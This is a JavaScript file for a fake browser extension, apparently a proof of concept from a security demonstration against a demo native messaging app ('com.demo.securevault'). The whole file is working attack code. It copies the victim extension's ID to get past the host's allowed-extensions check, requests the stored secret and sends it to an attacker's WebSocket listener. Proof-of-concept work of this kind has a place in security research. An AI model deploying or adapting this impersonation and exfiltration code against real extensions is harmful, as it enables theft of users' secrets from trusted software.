// Attack 3 — Extension Imitation: fake extension impersonating the victim.
// Same gecko ID -> host's allowed_extensions check passes.
// Reports stolen secret back to the attack script via WebSocket.

const TARGET  = 'com.demo.securevault';
const WS_PORT = 13502;

function report(event, data) {
  console.log('[FAKE-EXT]', event, JSON.stringify(data));
}

// Connect to attacker's local WebSocket receiver
const ws = new WebSocket(`ws://localhost:${WS_PORT}`);

ws.onopen = () => {
  report('ws_connected', {});

  // Connect to the real NM host and immediately request the secret
  let port = chrome.runtime.connectNative(TARGET);

  port.postMessage({ action: 'get_secret' });

  port.onMessage.addListener((msg) => {
    report('nm_recv', msg);
    ws.send(JSON.stringify({ event: 'nm_recv', msg }));

    if (msg.secret !== undefined) {
      report('SECRET_STOLEN', { secret: msg.secret });
      ws.send(JSON.stringify({ event: 'secret_stolen', secret: msg.secret }));
    } else if (msg.error) {
      ws.send(JSON.stringify({ event: 'error', error: msg.error }));
    }
  });

  port.onDisconnect.addListener(() => {
    const err = chrome.runtime.lastError?.message || null;
    report('nm_disconnect', { error: err });
    ws.send(JSON.stringify({ event: 'nm_disconnect', error: err }));
  });
};

ws.onerror = (e) => {
  report('ws_error', { msg: 'Could not connect to attack script receiver' });
};
